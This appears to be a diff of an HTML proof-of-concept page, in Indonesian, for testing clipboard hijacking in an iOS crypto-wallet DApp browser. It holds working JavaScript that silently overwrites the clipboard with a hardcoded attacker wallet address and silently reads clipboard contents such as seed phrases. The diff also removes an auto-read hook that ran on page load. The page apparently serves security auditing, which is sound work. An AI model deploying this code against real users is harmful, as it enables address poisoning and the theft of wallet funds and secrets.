@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BloFin DApp Browser - Clipboard Real Exploit/Test Scenarios</title>
+    <title>BloFin DApp Browser - Clipboard Exploit Proof of Concept</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -52,10 +52,23 @@
             border: 1px solid #30363d;
             padding: 10px;
             border-radius: 6px;
-            font-size: 12px;
+            font-size: 11px;
             overflow-x: auto;
             color: #7ee787;
             margin: 0;
+            word-break: break-all;
+            white-space: pre-wrap;
+        }
+        .address-tag {
+            font-family: monospace;
+            font-size: 11px;
+            color: #8b949e;
+            background: #0d1117;
+            padding: 4px 6px;
+            border-radius: 4px;
+            display: inline-block;
+            margin-bottom: 6px;
+            word-break: break-all;
         }
         .status-badge {
             display: inline-block;
@@ -71,47 +84,39 @@
 <body>
 
 <div class="container">
-    <h2>Real Scenario: iOS DApp Browser Clipboard Audit</h2>
+    <h2>PoC: iOS DApp Browser Clipboard Hijacking</h2>
 
+    <!-- Informasi Alamat Target -->
+    <div class="box" style="border-color: #58a6ff;">
+        <h3 style="margin-top:0; font-size:14px; color:#58a6ff;">Konfigurasi Simulasi</h3>
+        <div style="font-size: 12px;">Victim / Korban:</div>
+        <div class="address-tag">0xbD7918AE5AE25143426178cA2FB940f4D632fFC2</div>
+        <div style="font-size: 12px;">Attacker / Penyerang:</div>
+        <div class="address-tag" style="color: #ff7b72;">0xDDf9d60E588aCe13307aC1828d7DE211B4Ef949A</div>
+    </div>
+
+    <!-- SKENARIO 1: Silent Overwrite / Address Poisoning -->
     <div class="box">
-        <h3>1. writeText (Silent Payload Overwrite)</h3>
-        <p style="font-size: 13px; color: #8b949e;">Mengganti isi clipboard secara instan dengan address penyerang tanpa klik/konfirmasi.</p>
-        <label style="font-size: 12px;">Payload yang akan diinjeksikan:</label>
-        <input type="text" id="payloadInput" value="0xMaliciousAttackerAddressFake123456789" style="width:100%; padding:8px; background:#0d1117; border:1px solid #30363d; color:#fff; border-radius:4px; margin-top:4px; box-sizing:border-box;">
-        <button class="danger" onclick="executeSilentWrite()">Eksekusi Silent Overwrite</button>
+        <h3>1. writeText (Address Poisoning)</h3>
+        <p style="font-size: 13px; color: #8b949e;">Mengganti isi clipboard korban secara paksa dengan alamat penyerang tanpa izin.</p>
+        <label style="font-size: 12px;">Injeksi Alamat Attacker:</label>
+        <input type="text" id="payloadInput" value="0xDDf9d60E588aCe13307aC1828d7DE211B4Ef949A" style="width:100%; padding:8px; background:#0d1117; border:1px solid #30363d; color:#fff; border-radius:4px; margin-top:4px; box-sizing:border-box; font-size:12px;">
+        <button class="danger" onclick="executeSilentWrite()">Timpa Clipboard dengan Alamat Attacker</button>
         <div style="margin-top: 8px; font-size: 12px;">Status: <span id="writeStatus" class="status-badge badge-failed">Belum diuji</span></div>
     </div>
 
+    <!-- SKENARIO 2: Silent Read / Harvest Data -->
     <div class="box">
-        <h3>2. readText (Silent Seedphrase/Data Harvesting)</h3>
-        <p style="font-size: 13px; color: #8b949e;">Membaca isi clipboard pengguna secara diam-diam (misalnya setelah korban copy seed phrase dari tempat lain).</p>
-        <button onclick="executeSilentRead()">Eksekusi Silent Read</button>
+        <h3>2. readText (Clipboard Harvesting)</h3>
+        <p style="font-size: 13px; color: #8b949e;">Membaca data apa pun yang baru saja disalin oleh korban (misal: alamat korban atau seed phrase).</p>
+        <button onclick="executeSilentRead()">Baca Clipboard Korban secara Diam-diam</button>
         <div style="margin-top: 8px; font-size: 12px; margin-bottom: 8px;">Status: <span id="readStatus" class="status-badge badge-failed">Belum diuji</span></div>
         <pre id="readOutput">Hasil data clipboard: [Kosong]</pre>
-    </div>
-
-    <div class="box">
-        <h3>3. Auto-Hook on DApp Load</h3>
-        <p style="font-size: 13px; color: #8b949e;">Mencoba mengambil isi clipboard secara otomatis begitu halaman terbuka tanpa interaksi pengguna sama sekali.</p>
-        <pre id="autoHookOutput">Memeriksa auto-hook saat halaman dimuat...</pre>
     </div>
 </div>
 
 <script>
-    // Skenario 3: Auto-Hook saat DApp pertama kali dibuka di WebView
-    window.addEventListener('DOMContentLoaded', async () => {
-        const hookOut = document.getElementById('autoHookOutput');
-        try {
-            const clipboardData = await navigator.clipboard.readText();
-            hookOut.innerText = "CRITICAL: Berhasil auto-read saat load!\nIsi: " + clipboardData;
-            hookOut.style.color = "#ff7b72";
-        } catch (err) {
-            hookOut.innerText = "Auto-read diblokir saat load awal (Aman): " + err.message;
-            hookOut.style.color = "#7ee787";
-        }
-    });
-
-    // Skenario 1: Real Write Execution
+    // Skenario 1: Eksekusi Timpa Clipboard (Write)
     async function executeSilentWrite() {
         const payload = document.getElementById('payloadInput').value;
         const statusBadge = document.getElementById('writeStatus');
@@ -120,23 +125,23 @@
             await navigator.clipboard.writeText(payload);
             statusBadge.innerText = "SUCCESS (Clipboard Di-overwrite)";
             statusBadge.className = "status-badge badge-success";
-            alert("Berhasil overwrite clipboard tanpa prompt iOS!");
+            alert("Berhasil overwrite clipboard dengan alamat attacker tanpa prompt iOS!");
         } catch (err) {
             statusBadge.innerText = "FAILED: " + err.message;
             statusBadge.className = "status-badge badge-failed";
         }
     }
 
-    // Skenario 2: Real Read Execution
+    // Skenario 2: Eksekusi Baca Clipboard (Read)
     async function executeSilentRead() {
         const statusBadge = document.getElementById('readStatus');
         const outputPre = document.getElementById('readOutput');
 
         try {
             const text = await navigator.clipboard.readText();
-            statusBadge.innerText = "SUCCESS (Data Tercuri)";
+            statusBadge.innerText = "SUCCESS (Data Korban Terciduk)";
             statusBadge.className = "status-badge badge-success";
-            outputPre.innerText = text ? text : "[Clipboard Kosong / Mengembalikan String Kosong]";
+            outputPre.innerText = text ? text : "[Clipboard Kosong]";
         } catch (err) {
             statusBadge.innerText = "FAILED / BLOCKED";
             statusBadge.className = "status-badge badge-failed";
